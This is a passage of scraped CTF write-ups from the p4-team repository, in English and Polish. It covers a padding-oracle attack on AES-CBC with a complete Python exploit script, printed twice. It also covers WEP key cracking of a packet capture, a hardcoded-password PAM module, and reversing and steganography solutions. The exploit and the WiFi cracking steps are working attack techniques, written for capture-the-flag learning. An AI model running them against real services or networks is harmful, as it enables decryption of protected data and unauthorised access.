byte of the first block this value will be XORed with decrypted last byte of the second block.\nWe changed it so it won't get the \"proper\" value anymore, so the padding will be broken for sure... unless the value will become `0x1`, which is a correct padding indicator!\nIf the value became `0x1` this means that `our_changed_byte XOR decrypted_byte = 0x1` and this means that `decrypted_byte = our_changed_byte XOR 0x1`!\n\nSo if for a certain value we won't get decryption error this means we successfully decoded the last byte of ciphertext.\n\nNow we can extend this to more bytes - to recover the byte `k-1` we need to change the last byte to `0x2` and if we find the byte with no error in decryption it means that the xored value is also `0x2`.\n\nThis of course won't let us recover the first block, but this can't be helped, unless some special conditions are met.\nIn some cases the IV is placed as the first block of plaintext before encryption, and if this is the case, we could recover the IV as well.\nIn our case we had no knowledge of the way IV was handled, and if the IV is needed for us or not.\nWe assumed we don't need it and it turned out to be the right guess.\n\nThe attack implementation in python (we used https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py as template)\n\n```python\nimport base64\nimport re\nimport urllib\nimport urllib2\nimport sys\nfrom binascii import hexlify, unhexlify\nfrom itertools import cycle\n\n# most of the code comes from https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py\n'''\n    Padding Oracle Attack implementation of this article https://not.burntout.org/blog/Padding_Oracle_Attack/\n    Check the readme for a full cryptographic explanation\n    Author: mpgn <martial.puygrenier@gmail.com>\n    Date: 2016\n'''\n\n\ndef oracle(data):\n    url = \"http://crypto.chal.csaw.io:8001/\"\n    bytes_data = long_to_bytes(int(data, 16))\n    values = {'matrix-id': base64.b64encode(bytes_data)}\n    data = urllib.urlencode(values)\n    req = urllib2.Request(url, data)\n    response = urllib2.urlopen(req)\n    the_page = response.read()\n    if \"exception\" in the_page:\n        return False\n    else:\n        return True\n\n\ndef split_len(seq, length):\n    return [seq[i:i + length] for i in range(0, len(seq), length)]\n\n\n''' create custom block for the byte we search'''\n\n\ndef block_search_byte(size_block, i, pos, l):\n    hex_char = hex(pos).split('0x')[1]\n    return \"00\" * (size_block - (i + 1)) + (\"0\" if len(hex_char) % 2 != 0 else '') + hex_char + ''.join(l)\n\n\n''' create custom block for the padding'''\n\n\ndef block_padding(size_block, i):\n    l = []\n    for t in range(0, i + 1):\n        l.append((\"0\" if len(hex(i + 1).split('0x')[1]) % 2 != 0 else '') + (hex(i + 1).split('0x')[1]))\n    return \"00\" * (size_block - (i + 1)) + ''.join(l)\n\n\ndef hex_xor(s1, s2):\n    return hexlify(''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(unhexlify(s1), cycle(unhexlify(s2)))))\n\n\ndef run(ciphertext, size_block):\n    ciphertext = ciphertext.upper()\n    found = False\n    valid_value = []\n    result = []\n    len_block = size_block * 2\n    cipher_block = split_len(ciphertext, len_block)\n    if len(cipher_block) == 1:\n        print \"[-] Abort there is only one block\"\n        sys.exit()\n    for block in reversed(range(1, len(cipher_block))):\n        if len(cipher_block[block]) != len_block:\n            print \"[-] Abort length block doesn't match the size_block\"\n            break\n        print \"[+] Search value block : \", block, \"\\n\"\n        for i in range(0, size_block):\n            for ct_pos in range(0, 256):\n                if ct_pos != i + 1 or (\n                                len(valid_value) > 0 and int(valid_value[len(valid_value) - 1], 16) == ct_pos):\n                    bk = block_search_byte(size_block, i, ct_pos, valid_value)\n                    bp = cipher_block[block - 1]\n                    bc = block_padding(size_block, i)\n                    tmp = hex_xor(bk, bp)\n                    cb = hex_xor(tmp, bc).upper()\n                    up_cipher = cb + cipher_block[block]\n                    response = oracle(up_cipher)\n                    exe = re.findall('..', cb)\n                    discover = ''.join(exe[size_block - i:size_block])\n                    current = ''.join(exe[size_block - i - 1:size_block - i])\n                    find_me = ''.join(exe[:-i - 1])\n                    sys.stdout.write(\n                        \"\\r[+] Test [Byte %03i/256 - Block %d ]: \\033[31m%s\\033[33m%s\\033[36m%s\\033[0m\" % (\n                            ct_pos, block, find_me, current, discover))\n                    sys.stdout.flush()\n                    if response:\n                        found = True\n                        value = re.findall('..', bk)\n                        valid_value.insert(0, value[size_block - (i + 1)])\n                        print ''\n                        print \"[+] Block M_Byte : %s\" % bk\n                        print \"[+] Block C_{i-1}: %s\" % bp\n                        print \"[+] Block Padding: %s\" % bc\n                        print ''\n                        bytes_found = ''.join(valid_value)\n                        print '\\033[36m' + '\\033[1m' + \"[+]\" + '\\033[0m' + \" Found\", i + 1, \"bytes :\", bytes_found\n                        print ''\n                        break\n            if not found:\n                print \"\\n[-] Error decryption failed\"\n                result.insert(0, ''.join(valid_value))\n                hex_r = ''.join(result)\n                print \"[+] Partial Decrypted value (HEX):\", hex_r.upper()\n                padding = int(hex_r[len(hex_r) - 2:len(hex_r)], 16)\n                print \"[+] Partial Decrypted value (ASCII):\", hex_r[0:-(padding * 2)].decode(\"hex\")\n                sys.exit()\n            found = False\n        result.insert(0, ''.join(valid_value))\n        valid_value = []\n    print ''\n    hex_r = ''.join(result)\n    print \"[+] Decrypted value (HEX):\", hex_r.upper()\n    padding = int(hex_r[len(hex_r) - 2:len(hex_r)], 16)\n    print \"[+] Decrypted value (ASCII):\", hex_r[0:-(padding * 2)].decode(\"hex\")\n\n\ndef long_to_bytes(flag):\n    flag = str(hex(flag))[2:-1]\n    return \"\".join([chr(int(flag[i:i + 2], 16)) for i in range(0, len(flag), 2)])\n\n\ndef bytes_to_long(data):\n    return int(data.encode('hex'), 16)\n\n\nct = base64.b64decode(\n    \"9aMTHPS1oP9VQA9Hxz5mGSIRuOVSspcQrGJlBYUoZIUhmur9X1B8hJJFeR48trScLtToNPCeWZiSz4Qit3KvsHlv0Xqy8rHREJUvYNbff1I=\")\nhexlified = bytes_to_long(ct)\nrun(hex(hexlified)[2:-1], 16)\n```\n\nWhich gave us the flag in decrypted blocks: flag{what_if_i_told_you_you_solved_the_challenge}\n\n###PL version\n\nW zadaniu mamy stronę internetową z Neo idącym do Wyroczni.\nJest tam formularz html z ciągiem znaków base64.\nDekodowanie daje nam 80 losowych bajtów.\nCo kilka sekund dane ulegają zmianie, co sugeruje jakiś timestamp.\nJeśli podamy własny ciąg base64 strona odpowiada `AES decryption failed`.\nWszystko wskazuje na `Padding Oracle Attack` - podatność która pozwala odzyskać n-1 bloków szyfrogramu dla szyfru blokowego w trybie CBC.\n\nW trybie CBC tekst przed szyfrowaniem jest XORowany z zaszyfrowanym blokiem poprzednim.\nTo oznacza że zmiana jednego bajtu szyfrogramu spowoduje że wszystkie bajty na odpowiadającej pozycji w kolejnych blokach będą źle zdekodowane, ponieważ zostaną XORowane z inną wartością niż powinny.\nW naszym ataku chcemy wykorzystać to w jaki sposób deszyfrowanie wykorzystuje padding.\nW paddingu PKCS7 ostatni bajt zawsze określa parametry wypełnienia.\nTo liczba która mówi ile bajtów paddingu mamy oraz jaką wartość powinien przyjmować każdy z tych bajtów.\nNa przykład jeśli mamy 3 bajty paddingu w 16 bajtowym bloku to blok przyjmuje postać `XXXXXXXXXXXXX0x30x030x3`.\n\nJeśli padding nie ma poprawnej formy dostaniemy błąd deszyfrowania, ponieważ to oznacza że dane zostały uszkodzone/podmienione.\nW naszym ataku chcemy zgadnać bajt plaintextu poprzez zamienienie go w padding.\n\nZałóżmy że mamy 2 bloki szyfrogramu.\nJeśli zmienimy ostatni bajt pierwszego bloku to ta wartość zostanie XORowana z odszyfrowanym ostatnim bajtem drugiego bloku.\nPonieważ zmieniliśmy wartość na inną to ostatni bajt na pewno nie będzie miał już wartości \"poprawnej\" więc padding będzie zepsutu... chyba że przypadkiem uzyskamy wartość `0x1`, która jest poprawnym paddingiem!\nJeśli wartość stała się teraz `0x1` to znaczy że `nasz_zmieniony_bajt XOR odszyfrowany_bajt = 0x1` z czego wynika że `odszyfrowany_bajt = nasz_zmieniony_bajt XOR 0x1`!\n\nWięc jeśli dla jakiejś wartości nie wystąpi błąd deszyfrowania to znaczy że właśnie odkodowaliśmy ostatni bajt szyfrogramu.\n\nMożemy to teraz rozszerzyć na więcej bajtów - aby odzyskać teraz bajt `k-1` potrzebujemy aby ostatni bajt przyjął wartość `0x2` (możemy to zrobić bo znamy już wartość ostatniego bajtu) i jeśli znajdziemy teraz bajt na pozycji k-1 dla którego nie wystąpi błąd deszyfrowania to znaczy że wartość po XORowaniu wynosi teraz `0x2`.\n\nTo oczywiście nie pozwoli nam odzyskać pierwszego bloku, ale z tym nic nie zrobimy, chyba że mamy do czynienia z pewną szczególną sytuacją, kiedy IV jest dodane jako pierwszy blok plaintextu.\nW takiej sytuacji jesteśmy w stanie odzyskać także IV.\nW naszym przypadku nie wiedzieliśmy nic na temat IV ani czy jest nam on do czegoś potrzebny, w związku z czym założyliśmy że nie i okazało się to być założeniem poprawnym.\n\nAtak zaimplementowaliśmy w pythonie (korzystając z https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py jako szablonu)\n\n```python\nimport base64\nimport re\nimport urllib\nimport urllib2\nimport sys\nfrom binascii import hexlify, unhexlify\nfrom itertools import cycle\n\n# most of the code comes from https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py\n'''\n    Padding Oracle Attack implementation of this article https://not.burntout.org/blog/Padding_Oracle_Attack/\n    Check the readme for a full cryptographic explanation\n    Author: mpgn <martial.puygrenier@gmail.com>\n    Date: 2016\n'''\n\n\ndef oracle(data):\n    url = \"http://crypto.chal.csaw.io:8001/\"\n    bytes_data = long_to_bytes(int(data, 16))\n    values = {'matrix-id': base64.b64encode(bytes_data)}\n    data = urllib.urlencode(values)\n    req = urllib2.Request(url, data)\n    response = urllib2.urlopen(req)\n    the_page = response.read()\n    if \"exception\" in the_page:\n        return False\n    else:\n        return True\n\n\ndef split_len(seq, length):\n    return [seq[i:i + length] for i in range(0, len(seq), length)]\n\n\n''' create custom block for the byte we search'''\n\n\ndef block_search_byte(size_block, i, pos, l):\n    hex_char = hex(pos).split('0x')[1]\n    return \"00\" * (size_block - (i + 1)) + (\"0\" if len(hex_char) % 2 != 0 else '') + hex_char + ''.join(l)\n\n\n''' create custom block for the padding'''\n\n\ndef block_padding(size_block, i):\n    l = []\n    for t in range(0, i + 1):\n        l.append((\"0\" if len(hex(i + 1).split('0x')[1]) % 2 != 0 else '') + (hex(i + 1).split('0x')[1]))\n    return \"00\" * (size_block - (i + 1)) + ''.join(l)\n\n\ndef hex_xor(s1, s2):\n    return hexlify(''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(unhexlify(s1), cycle(unhexlify(s2)))))\n\n\ndef run(ciphertext, size_block):\n    ciphertext = ciphertext.upper()\n    found = False\n    valid_value = []\n    result = []\n    len_block = size_block * 2\n    cipher_block = split_len(ciphertext, len_block)\n    if len(cipher_block) == 1:\n        print \"[-] Abort there is only one block\"\n        sys.exit()\n    for block in reversed(range(1, len(cipher_block))):\n        if len(cipher_block[block]) != len_block:\n            print \"[-] Abort length block doesn't match the size_block\"\n            break\n        print \"[+] Search value block : \", block, \"\\n\"\n        for i in range(0, size_block):\n            for ct_pos in range(0, 256):\n                if ct_pos != i + 1 or (\n                                len(valid_value) > 0 and int(valid_value[len(valid_value) - 1], 16) == ct_pos):\n                    bk = block_search_byte(size_block, i, ct_pos, valid_value)\n                    bp = cipher_block[block - 1]\n                    bc = block_padding(size_block, i)\n                    tmp = hex_xor(bk, bp)\n                    cb = hex_xor(tmp, bc).upper()\n                    up_cipher = cb + cipher_block[block]\n                    response = oracle(up_cipher)\n                    exe = re.findall('..', cb)\n                    discover = ''.join(exe[size_block - i:size_block])\n                    current = ''.join(exe[size_block - i - 1:size_block - i])\n                    find_me = ''.join(exe[:-i - 1])\n                    sys.stdout.write(\n                        \"\\r[+] Test [Byte %03i/256 - Block %d ]: \\033[31m%s\\033[33m%s\\033[36m%s\\033[0m\" % (\n                            ct_pos, block, find_me, current, discover))\n                    sys.stdout.flush()\n                    if response:\n                        found = True\n                        value = re.findall('..', bk)\n                        valid_value.insert(0, value[size_block - (i + 1)])\n                        print ''\n                        print \"[+] Block M_Byte : %s\" % bk\n                        print \"[+] Block C_{i-1}: %s\" % bp\n                        print \"[+] Block Padding: %s\" % bc\n                        print ''\n                        bytes_found = ''.join(valid_value)\n                        print '\\033[36m' + '\\033[1m' + \"[+]\" + '\\033[0m' + \" Found\", i + 1, \"bytes :\", bytes_found\n                        print ''\n                        break\n            if not found:\n                print \"\\n[-] Error decryption failed\"\n                result.insert(0, ''.join(valid_value))\n                hex_r = ''.join(result)\n                print \"[+] Partial Decrypted value (HEX):\", hex_r.upper()\n                padding = int(hex_r[len(hex_r) - 2:len(hex_r)], 16)\n                print \"[+] Partial Decrypted value (ASCII):\", hex_r[0:-(padding * 2)].decode(\"hex\")\n                sys.exit()\n            found = False\n        result.insert(0, ''.join(valid_value))\n        valid_value = []\n    print ''\n    hex_r = ''.join(result)\n    print \"[+] Decrypted value (HEX):\", hex_r.upper()\n    padding = int(hex_r[len(hex_r) - 2:len(hex_r)], 16)\n    print \"[+] Decrypted value (ASCII):\", hex_r[0:-(padding * 2)].decode(\"hex\")\n\n\ndef long_to_bytes(flag):\n    flag = str(hex(flag))[2:-1]\n    return \"\".join([chr(int(flag[i:i + 2], 16)) for i in range(0, len(flag), 2)])\n\n\ndef bytes_to_long(data):\n    return int(data.encode('hex'), 16)\n\n\nct = base64.b64decode(\n    \"9aMTHPS1oP9VQA9Hxz5mGSIRuOVSspcQrGJlBYUoZIUhmur9X1B8hJJFeR48trScLtToNPCeWZiSz4Qit3KvsHlv0Xqy8rHREJUvYNbff1I=\")\nhexlified = bytes_to_long(ct)\nrun(hex(hexlified)[2:-1], 16)\n```\n\nCo dało nam flagę w odszyfrowanych blokach: flag{what_if_i_told_you_you_solved_the_challenge}\n", "timestamp": "2025-10-21T13:31:38.124293"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-16-csaw/regexpire/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-16-csaw/regexpire/README.md", "content": "## Regexpire (Misc/PPC, 100p)\n\n###ENG\n[PL](#pl-version)\n\nTask almost identical to https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/ppc_isolve so we solved it pretty much the same way - with simplified xeger:\n\n```python\nimport socket\nfrom rstr import xeger\n\n\ndef recvuntil(s, tails):\n    data = \"\"\n    while True:\n        for tail in tails:\n            if tail in data:\n                return data\n        data += s.recv(1)\n\n\ndef main():\n    url = \"misc.chal.csaw.io\"\n    port = 8001\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((url, port))\n    task1 = recvuntil(s, \"\\n\")\n    print(task1)\n    while True:\n        task2 = recvuntil(s, \"\\n\")\n        print(task2)\n        to_solve = task2[:-1]\n        if len(to_solve) != 0:\n            print(\"to solve = '%s'\" % to_solve)\n            solution = xeger(to_solve)\n            print(\"solution  = %s\" % solution)\n            s.sendall(solution + \"\\n\")\nmain()\n```\n\nWith modifications to:\n\n```python\n\nALPHABETS = {'printable': ['a'],\n             'letters': ['a'],\n             'uppercase': ['A'],\n             'lowercase': ['a'],\n             'digits': ['1'],\n             'punctuation': [','],\n             'nondigits': ['a'],\n             'nonletters': ['1'],\n             'whitespace': [' '],\n             'nonwhitespace': ['a'],\n             'normal': ['a'],\n             'word': ['a'],\n             'nonword': ['#'],\n             'postalsafe': string.ascii_letters + string.digits + ' .-#/',\n             'urlsafe': string.ascii_letters + string.digits + '-._~',\n             'domainsafe': string.ascii_letters + string.digits + '-'\n             }\n```\n\nbecause the server did not handle everything.\n\n`flag{^regularly_express_yourself$}`\n\n###PL version\n\nZadanie prawie identyczne jak https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/ppc_isolve więc rozwiązaliśmy je tak samo, zmodyfikowanym xegerem:\n\n```python\nimport socket\nfrom rstr import xeger\n\n\ndef recvuntil(s, tails):\n    data = \"\"\n    while True:\n        for tail in tails:\n            if tail in data:\n                return data\n        data += s.recv(1)\n\n\ndef main():\n    url = \"misc.chal.csaw.io\"\n    port = 8001\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((url, port))\n    task1 = recvuntil(s, \"\\n\")\n    print(task1)\n    while True:\n        task2 = recvuntil(s, \"\\n\")\n        print(task2)\n        to_solve = task2[:-1]\n        if len(to_solve) != 0:\n            print(\"to solve = '%s'\" % to_solve)\n            solution = xeger(to_solve)\n            print(\"solution  = %s\" % solution)\n            s.sendall(solution + \"\\n\")\nmain()\n```\n\nZ modyfikacją dla:\n\n```python\nALPHABETS = {'printable': ['a'],\n             'letters': ['a'],\n             'uppercase': ['A'],\n             'lowercase': ['a'],\n             'digits': ['1'],\n             'punctuation': [','],\n             'nondigits': ['a'],\n             'nonletters': ['1'],\n             'whitespace': [' '],\n             'nonwhitespace': ['a'],\n             'normal': ['a'],\n             'word': ['a'],\n             'nonword': ['#'],\n             'postalsafe': string.ascii_letters + string.digits + ' .-#/',\n             'urlsafe': string.ascii_letters + string.digits + '-._~',\n             'domainsafe': string.ascii_letters + string.digits + '-'\n             }\n```\n\nBo serwer nie wszystko dobrze parsował.\n\n`flag{^regularly_express_yourself$}`", "timestamp": "2025-10-21T13:31:38.368994"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-24-dctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-24-dctf/README.md", "content": "# Writeup Defcamp CTF Quals 2016\n\nTeam: psrok1, seikendev, c7f.m0d3, cr019283, nazywam, rev, msm, akrasuski1, shalom\n\n![](./scoreboard.png)\n\n![](./chart.png)\n\n### Table of contents\n\n* [F4ceb00k 60s (Web 100)](web100)\n* [URL Anonymizer (Web 200)](web200)\n* [Bad OTPxploited (RevCrypt 100)](revcrypt100)\n* [Rucksack  (RevCrypt 200)](revcrypt200)\n* [Decoy (RevCrypt 300)](revcrypt300)\n* [dctfizer (RevCrypt 400)](revcrypt400)\n* [Warm heap (Exploit 100)](exp100)\n* [The nospecial virus (Misc 100)](misc100)\n* [b4s14l (Misc 150)](misc150)\n* [Musicetry (Misc 200)](musicetry_misc_200)\n* [Evil farmers (Misc 400)](misc400)\n", "timestamp": "2025-10-21T13:31:39.047592"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-24-dctf/misc400/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-24-dctf/misc400/README.md", "content": "## Evil farmers (Misc, 400, 3 solves)\r\n\ttl;dr Brute-force first wep password, find second wep password, recover peppers\r\n\r\nWe start off by exporting the capture to `pcap` using wireshark, `aircrack-ng` doesn't allow `pcapng` as input.\r\n\r\nAfter loading it in `aircrack-ng` and removing networks without any handshakes, captured IVS and names, we're left with:\r\n\r\n```\r\n#     BSSID              ESSID                     Encryption\r\n1     C4:6E:1F:97:74:5C  FLOVIOMEL                 WPA (1 handshake)\r\n8     C8:3A:35:50:F7:F0  ChattyOfficeInc           WEP (132219 IVs)\r\n13    58:6D:8F:2C:C9:98  Linksys F                 WPA (1 handshake)\r\n26    00:00:00:00:00:00  Ù                         WEP (1 IVs)\r\n2914  CA:FF:FF:FF:FF:FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿ?:¯@€oðN??  WEP (1 IVs)\r\n\r\n```\r\n\r\n`ChattyOfficeInc` looks interesting, 132k IVs should be more than enough to crack it using PTW attack.\r\n\r\nUnfortunately, that didn't work, we had to brute-force the password, which turned out to be `lamep`\r\n\r\n```\r\nmichal@ctf:/media/sf_Desktop$ airdecap-ng -w 6c:61:6d:65:70 look.pcap \r\nTotal number of packets read        646333\r\nTotal number of WEP data packets    147872\r\nTotal number of WPA data packets     30161\r\nNumber of plaintext data packets        44\r\nNumber of decrypted WEP  packets     30452\r\nNumber of corrupted WEP  packets         0\r\nNumber of decrypted WPA  packets         0\r\n```\r\n\r\nUsing a cool program [Network Miner](http://www.netresec.com/?page=NetworkMiner), we were able to quickly find a suspicious POST login:\r\n\r\n![scr1](scr1.png)\r\n\r\nAfter some investigation, we found out, that our farmer has changed the WEP password\r\n\r\n```\r\nForm item: \"wifiEn\" = \"disabled\"\r\nForm item: \"wpsmethod\" = \"pbc\"\r\nForm item: \"GO\" = \"wireless_security.asp\"\r\nForm item: \"ssidIndex\" = \"ChattyOfficeInc\"\r\nForm item: \"security_mode\" = \"1\"\r\nForm item: \"security_shared_mode\" = \"enable\"\r\nForm item: \"wep_default_key\" = \"1\"\r\nForm item: \"wep_key_1\" = \"keepgoingdude\"\r\nForm item: \"WEP1Select\" = \"1\"\r\nForm item: \"wep_key_2\" = \"ASCII\"\r\nForm item: \"WEP2Select\" = \"1\"\r\nForm item: \"wep_key_3\" = \"ASCII\"\r\nForm item: \"WEP3Select\" = \"1\"\r\nForm item: \"wep_key_4\" = \"ASCII\"\r\nForm item: \"WEP4Select\" = \"1\"\r\nForm item: \"cipher\" = \"aes\"\r\nForm item: \"passphrase\" = \"12345678\"\r\nForm item: \"keyRenewalInterval\" = \"3600\"\r\nForm item: \"wpsenable\" = \"disabled\"\r\nForm item: \"wpsMode\" = \"pbc\"\r\nForm item: \"PIN\" = \"\"\r\n```\r\n\r\nSo `keepgoingdude` is the second WEP password, let's decrypt the pcap one more time\r\n\r\nIt turns out that the farmer got a little naughty ;), but that wasn't the point of the challange\r\n\r\nWe've noticed a suspicous `Internet Printing Protocol` stream with `job-name: flag.png`\r\n\r\nAfter a lot of struggling to recover the PostScript file, we've managed to get a part of it:\r\n\r\n![scr2](scr2.png)\r\n\r\nAnd get the flag: `DCTF{md5(\"pepper\")}`", "timestamp": "2025-10-21T13:31:39.538688"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-24-dctf/revcrypt100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-24-dctf/revcrypt100/README.md", "content": "#  Bad OTPxploited (RevCrypt 100)\n\n> Security buzzwords are used by companies and individuals everywhere althought not all of them even follow good practices, some even provide closed source implementations. Someone published his own OTP library on a subreddit and claims it's unbeatable. Is it? 10.13.37.41 \n\n> https://dctf.def.camp/quals-2016/mypam.bin\n\nThe binary in the task was a shared library implementing a couple of functions, such as `pam_sm_authenticate`. Googling\nit revealed it's `Pluggable authentication module`, used for example as SSH authentication extension. The algorithm was\nsimple: the user was compared to hardcoded `dctf`, and the password was also constant string concatenated with current date\nand time, precise up to minute. After logging in to SSH server running on given IP with found credentials, we received the flag.\n", "timestamp": "2025-10-21T13:31:39.834213"}
{"source": "github", "repo": "p4-team/ctf", "file": "2016-09-24-dctf/revcrypt200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2016-09-24-dctf/revcrypt200/README.md", "content": "#  Rucksack (RevCrypt 200) \n\n>  Find the value that encoded gives \"B75B63369A52F5F30CFE5E642\" to open the flag archive.\nhttps://dctf.def.camp/quals-2016/rucksack.tar.gz  \n\nThe binary given in challenge was simple windows dialog window. It was performing some interesting calculations on given number, and returning the result.\n\nInteresting part of the algorithm looked like this after decompilation:\n\n```c\n  dword_401368 = 0;\n  dword_401364 = 0;\n  dword_401360 = 0;\n  dword_40135C = 0;\n  do\n  {\n    v14 = dword_401354 & 1;\n    dword_401354 = (unsigned int)dword_401354 >> 1;\n    v15 = __RCR__(dword_401358, v14);\n    v14 = __CFRCR__(dword_401358, v14);\n    dword_401358 = v15;\n    if ( v14 )\n    {\n      v16 = v12[2];\n      v14 = __CFADD__(v16, dword_40135C);\n      dword_40135C += v16;\n      v17 = v12[1];\n      v18 = v14;\n      v14 = __CFADD__(v14, dword_401360) | __CFADD__(v17, v14 + dword_401360);\n      dword_401360 += v17 + v18;\n      v19 = v14;\n      v14 = __CFADD__(v14, dword_401364) | __CFADD__(*v12, v14 + dword_401364);\n      dword_401364 += *v12 + v19;\n      dword_401368 += v14;\n    }\n    v12 += 3;\n    --v13;\n  }\n  while ( v13 );\n```\n\nBut it turned out to be really simple algorithm, after reverse engineering it:\n\n```python\ndef hack(input):\n    dw = 0\n    for i in range(64):\n        carry = input & 1\n        input >>= 1\n        if carry:\n            dw += data[i]\n    return dw\n```\n\nWhere `data` stands for big static array filled with big numbers:\n\n```python\ndata = [\n    58692287682224938532079129932L, 54124250491778978820692485381L,\n    7277220015820983195773562608L, 22332383050669823978020089761L,\n    16967063558604003742849514894L, 62355997480269765615210626760L,\n    5170363880013545458168089364L, 14258428081357094750634713280L,\n    36287775811261632958539463292L, 64158589039078535932527740088L,\n    4957165945420369897339450045L, 48887024134310311336003185458L,\n    18793329531325217943998377262L, 34849054916999515597115226753L,\n    34004947907188645530085195162L, 34292499970059354752786233092L,\n    7465958787690007484635596453L, 54523540218652065182276201159L,\n    57000747039828947704764319534L, 50575388677892232980068371694L,\n    3702058161015823872166782237L, 3349829679265481129755048986L,\n    28405544429942218214723074100L, 36495788164044649888936432337L,\n    48544464129042978733031529923L, 60050271447609162325797432216L,\n    17009291688635671258136540844L, 32243452400131210275321820528L,\n    19435400185697379146087163973L, 18958695960561396891652356392L,\n    31046838278903521493393091567L, 22039804766852830688395024152L,\n    57057512556148595984239556858L, 60234203621762490899836532853L,\n    17520024899042505063126260369L, 47991875009003147708419421093L,\n    2490616484966554508753587547L, 2899153068397613767531906868L,\n    52497993703425658528041503014L, 52472487311532478269420426577L,\n    40482174126297668775911754500L, 16911496622935987625595000117L,\n    46693438934980177103776837991L, 1284890835773525386783112485L,\n    54477823291266207382876225082L, 61740894964814382664396357499L,\n    46647309100226523278177395127L, 16502561642567509404189158915L,\n    19004498941637468189390997034L, 9828916790346848731369187336L,\n    35425036974884801641584840823L, 31415726379765125631239673685L,\n    17972704773815859985638190557L, 9936946611209044418233820319L,\n    36798963351701498896151091569L, 13848431692126270671326713024L,\n    3198504385930460160976160781L, 16499536430449755854269030517L,\n    57509243300349206773820711938L, 43866494813937969559452082306L,\n    54036517188127062281695050584L, 27536442945835183874395339046L,\n    27752811040789181632791691991L, 55343638437809942929901949018L\n]\n```\n\nSo this challenge is equivalent to solving subset sum problem (which is NP Complete, but good solvers exist in practice).\n\nWe implemented simple solved in SAGE, and after a while it printed a solution:\n\n```\n[0, 0, 7277220015820983195773562608, 22332383050669823978020089761, 0,\n62355997480269765615210626760, 0, 0, 0, 0, 0, 48887024134310311336003185458,\n18793329531325217943998377262, 34849054916999515597115226753, 0, 0,\n7465958787690007484635596453, 54523540218652065182276201159, 0, 0,\n3702058161015823872166782237, 3349829679265481129755048986,\n28405544429942218214723074100, 36495788164044649888936432337, 0,\n60050271447609162325797432216, 0, 0, 0, 0, 0, 22039804766852830688395024152,\n57057512556148595984239556858, 60234203621762490899836532853,\n17520024899042505063126260369, 0, 0, 0, 0, 0, 40482174126297668775911754500, 0,\n0, 1284890835773525386783112485, 54477823291266207382876225082,\n61740894964814382664396357499, 0, 16502561642567509404189158915,\n19004498941637468189390997034, 0, 35425036974884801641584840823, 0,\n17972704773815859985638190557, 0, 0, 0, 0, 16499536430449755854269030517, 0,\n43866494813937969559452082306, 0, 0, 0, 55343638437809942929901949018]\n```\n\nAfter that we recovered good input, and decrypted 7z file given in challenge:\n\n![](./flag.jpg)\n", "timestamp": "2025-10-21T13:31:40.065162"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-05-18-confidence-finals/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-05-18-confidence-finals/README.md", "content": "# Writeup CONFidence CTF Finals 2017\n\nTeam: akrasuski1, msm, nazywam, rev\n\n![](photo.png)\n\n### Table of contents\n\n* [Random (crypto 100)](random)\n* [Starbyte (misc 200)](starbyte)\n* [KeygenMe (reverse 400)](keygenme)\n* [??? (crypto 300)](crypto)\n", "timestamp": "2025-10-21T13:31:50.679704"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-05-18-confidence-finals/starbyte/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-05-18-confidence-finals/starbyte/README.md", "content": "# Starbyte (misc, 200p)\n\nThis challenge was supposed to be misc, but we all agreed that this is more like stegano. \"Better kind\" of stegano (as always from gynvael!) but still.\n\nSo we were given strange sound file - [starbyte](starbyte). You can easily see \"bits\" in the transmission:\n\n![](./ss.png)\n\nMy teammate quickly wrote parser for this, and converted it to bytes. Unfortunatelly, we became stuck at this point for some time - for some reason we thought that data was in 5-bit-chunks, when in fact we should look at data in 10-bit-chunks. After acknowledging that, parsing was easy:\n\n\n```python\nimport wave, array\n\nf = wave.open('starbyte')\n\nnew_wave = True\n\nsum = 0\nnum = 0\n\ntmp_out = \"\"\nout = \"\"\n\nf_out = \"\"\n\nbinary = open(\"binary\", \"w\")\n\ntot = 0\nout = []\nNNN = 10\nfor s in array.array('h', f.readframes(f.getnframes())):\n    if s < 5000:\n        if not new_wave:\n\n            if sum/num > 20000:\n                tmp_out += \"1\"\n                binary.write(\"1\")\n            else:\n                tmp_out += \"0\"\n                binary.write(\"0\")\n\n            #if len(tmp_out) == 5:\n            #    f_out += chr(int(tmp_out, 2))\n            #    tmp_out = \"\"\n\n            tot += 1\n            if len(tmp_out) == NNN:\n                #f_out += chr(int(tmp_out, 2))\n                out.append(int(tmp_out, 2))\n                tmp_out = \"\"\n\n        sum = 0\n        num = 0\n        new_wave = True\n    else:\n        sum += s\n        num += 1\n        new_wave = False\n\nimport string\ncharset = string.digits + string.lowercase\nx = ''\noutd = out\nK = ''\nfor o in out:\n    kek = ('000000000000000' + bin(o)[2:])[-10:][:-2]\n    i = kek[::-1]\n    i = int(i, 2)\n    K += chr(i)\n\nprint K\n```\n\nData was just ASCII, but in 10-bit-chunks and reversed. You could guess that, because 3 last bits of every chunk was always zero. If you assume that these are in fact wrapped bytes, then you have bytes with last bit always equal to zero - and this strongly suggests reversed ascii characters.\n\n\nBut this was only stage 1. After that we get a long text file - [cmds.txt](cmds.txt). Snippet:\n\n```\nLINE 612 437 612 425\nLINE 650 211 650 223\nCRCL 437 312 3\nLINE 779 355 779 393\nLINE 783 355 795 355\nLINE 612 501 612 489\nLINE 454 308 454 299\nLINE 589 311 587 320\nLINE 811 393 799 